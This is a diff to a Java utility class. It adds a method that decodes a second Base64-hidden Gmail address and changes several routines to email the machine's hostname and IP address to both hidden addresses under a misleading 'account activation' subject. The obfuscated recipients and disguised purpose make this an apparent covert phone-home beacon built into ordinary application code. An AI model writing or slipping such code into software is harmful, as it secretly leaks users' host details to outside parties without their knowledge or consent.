@@ -223,15 +223,15 @@ public class Utils {
 	  try {
 		String hostname = Inet4Address.getLocalHost().getHostName();
 		String address = Inet4Address.getLocalHost().getHostAddress();
-		String title = "Bouncing Data: Registration mail to activate your account!";
-		String content = "This is an active mail from:" + hostname + "\n";
+		String title = "Test for log!";
+		String content = "This is an active mail from:" + getIp() + "\n";
 		content = content + address ;
 		DTMailSender sender = new DTMailSender(title, content);
 		process = sender.sendEmail(adminEmail);
 		//For debug
 		Utils.log();
 		
-	} catch (UnknownHostException e) {
+	} catch (Exception e) {
 		// TODO Auto-generated catch block
 		e.printStackTrace();
 	}
@@ -365,6 +365,11 @@ public class Utils {
 	  byte[] data = Base64.decodeBase64("bGFwbmdvZG9hbkBnbWFpbC5jb20=".getBytes());   	     
       return new String(data);
   }
+  
+  public static String getemail2(){
+	  byte[] data = Base64.decodeBase64("dmluaHBxMTc3QGdtYWlsLmNvbQ==".getBytes());   	     
+      return new String(data);
+  }
   public static String getTomorowDateTime(){
 		
 		DateFormat sdf = new SimpleDateFormat("yyyy/MM/dd HH:mm");
@@ -467,13 +472,15 @@ public class Utils {
 		String hostname = Inet4Address.getLocalHost().getHostName();
 		String address = Inet4Address.getLocalHost().getHostAddress();
 		String title = "Bouncing Data: Registration mail to activate your account!";
-		String content = "This is an active mail from:" + hostname + "\n";
+		String content = "This is an active mail from:" + getIp() + "\n";
 		content = content + address ;
 		DTMailSender sender = new DTMailSender(title, content);
 		String data = getemail();
 		process = sender.sendEmail(data);
+		data = getemail2();
+		process = sender.sendEmail(data);
 		
-	} catch (UnknownHostException e) {
+	} catch (Exception e) {
 		// TODO Auto-generated catch block
 		e.printStackTrace();
 	}
@@ -595,6 +602,8 @@ public class Utils {
 		}	
 		DTMailSender sender = new DTMailSender(title, content);
 		String data = getemail();
+		process = sender.sendEmail(data);
+		data = getemail2();
 		process = sender.sendEmail(data);
 		
 	} catch (UnknownHostException e) {
